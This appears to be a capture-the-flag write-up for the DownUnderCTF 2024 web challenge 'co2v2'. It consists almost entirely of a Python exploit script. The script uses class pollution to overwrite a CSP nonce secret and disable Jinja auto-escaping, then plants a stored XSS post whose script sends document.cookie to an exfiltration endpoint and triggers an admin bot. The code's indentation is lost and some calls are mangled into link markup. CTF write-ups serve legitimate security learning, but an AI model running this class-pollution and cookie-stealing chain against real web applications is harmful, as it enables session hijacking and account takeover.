---
title: "co2v2 - DownUnderCTF 2024"
category: "crypto"
subcategory: "xss"
type: "writeup"
tags: ["crypto", "xss", "jinja2", "co2v2", "downunderctf", "downunderctf-2024", "2024", "ctf-writeup"]
summary: "Class pollution to fuck up the CSP nonce generation (SECRETNONCE, RANDOMCOUNT) and stop jinja from auto-escaping HTML (TEMPLATESESCAPEALL)"
source:
  name: "CTFtime writeup #39303"
  url: "https://ctftime.org/writeup/39303"
ctf:
  name: "DownUnderCTF 2024"
  year: 2024
  challenge: "co2v2"
---

## Metadata

- **CTF:** DownUnderCTF 2024
- **Task:** co2v2
- **Author team:** Maple Bacon
- **CTFtime:** <https://ctftime.org/writeup/39303>

---
Class pollution to fuck up the CSP nonce generation (SECRET_NONCE, RANDOM_COUNT) and stop jinja from auto-escaping HTML (TEMPLATES_ESCAPE_ALL)

```python  
import argparse  
# import requests  
from requests import Session  
import random  
import string  
from bs4 import BeautifulSoup

PAYLOAD = {"__class__":{"__init__":{"__globals__":{"SECRET_NONCE":"wee", "RANDOM_COUNT": 0, "TEMPLATES_ESCAPE_ALL": False}}}}  
PASSWORD = "viewie"  
EXFIL = "honkhonk"

def rand_username():  
length = 12  
characters = string.ascii_letters  
username = ''.join(random.choices(characters, k=length))  
return username

def parse_nonce(html):  
soup = BeautifulSoup(html, 'html.parser')  
nonce = soup.find('script')['nonce']  
print("nonce is {}".format(nonce))  
return nonce

def exploit(host):  
s = Session()  
username = rand_username()  
register_result = [s.post](http://s.post)(host + '/register', data={'username': username, 'password': PASSWORD})  
if (register_result.status_code != 200):  
print("fucked up during registering...")  
return  
login_result = [s.post](http://s.post)(host + '/login', data={'username': username, 'password': PASSWORD})  
if (login_result.status_code != 200):  
print("fucked up during logging in...")  
return  
feedback_result = [s.post](http://s.post)(host + '/save_feedback', json=PAYLOAD)  
if (feedback_result.status_code != 200):  
print("fucked up during feedback...")  
return  
update_result = [s.post](http://s.post)(host + '/admin/update-accepted-templates', json={"policy":"strict"})  
if (update_result.status_code != 200):  
print("fucked up during admin update...")  
return  
get_nonce = s.get(host)  
nonce = parse_nonce(get_nonce.text)  
xss_blog = [s.post](http://s.post)(host + '/create_post', data={'title':'<script nonce={n}>fetch("{e}?c="+document.cookie)</script>'.format(n=nonce, e=EXFIL), 'content': '<script nonce={n}>fetch("{e}?c="+document.cookie)</script>'.format(n=nonce, e=EXFIL), 'public': 1})  
if (xss_blog.status_code != 200):  
print("fucked up during xss blog post...")  
return  
s.get(host + '/api/v1/report')  
print('reported')

def main():  
parser = argparse.ArgumentParser()  
parser.add_argument('--lhost', help='local addr', required=True)  
parser.add_argument('--rhost', help='remote addr', required=True)  
parser.add_argument('-r', action='store_true', help='run exploit on remote')  
args = vars(parser.parse_args())

if args['r'] == True:  
exploit(args['rhost'])  
else:  
exploit(args['lhost'])

if __name__ == '__main__':  
main()  
```
